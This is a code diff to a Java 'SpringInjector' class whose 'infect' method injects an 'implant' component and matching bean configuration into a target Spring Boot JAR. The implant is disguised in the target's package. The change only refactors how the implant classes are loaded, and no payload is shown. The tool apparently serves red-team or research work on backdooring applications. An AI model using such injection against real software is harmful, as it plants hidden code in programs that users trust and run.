@@ -13,13 +13,12 @@ import java.util.jar.JarEntry;
 import static org.example.injector.Helpers.*;
 
 public class SpringInjector {
-    private final Class<?> implantComponentClass;
-    private final Class<?> implantSpringConfigClass;
+    private final ImplantHandler implantComponentHandler;
+    private final ImplantHandler implantSpringConfigHandler;
 
-
-    public SpringInjector(Class<?> implantComponent, Class<?> implantSpringConfig) {
-        this.implantComponentClass = implantComponent;
-        this.implantSpringConfigClass = implantSpringConfig;
+    public SpringInjector(ImplantHandler implantComponentHandler, ImplantHandler implantSpringConfigHandler) {
+        this.implantComponentHandler = implantComponentHandler;
+        this.implantSpringConfigHandler = implantSpringConfigHandler;
     }
 
     public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
@@ -52,7 +51,7 @@ public class SpringInjector {
                      * @ComponentScan is used (included in the @SpringBootApplication annotation). If not, then this
                      * component needs to be explicitly referenced as a @Bean in the config class.
                      */
-                    ClassFile implantComponent = ImplantReader.findAndReadClassFile(implantComponentClass);
+                    ClassFile implantComponent = implantComponentHandler.loadFreshConfiguredSpecimen();
                     String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
                     String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
                     implantComponent.setName(targetPackageName + "." + implantComponentClassName);
@@ -94,7 +93,7 @@ public class SpringInjector {
     }
 
     private boolean addBeanToSpringConfig(ClassFile existingSpringConfig, ClassFile implantComponent) throws IOException, ClassNotFoundException {
-        ClassFile implantSpringConfig = ImplantReader.findAndReadClassFile(implantSpringConfigClass);
+        ClassFile implantSpringConfig = implantSpringConfigHandler.loadFreshConfiguredSpecimen();
         String implantPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(implantSpringConfig.getName()));
         String targetPackageDesc = convertToClassFormatFqcn(parsePackageNameFromFqcn(existingSpringConfig.getName()));
         String implantComponentClassName = parseClassNameFromFqcn(implantComponent.getName());
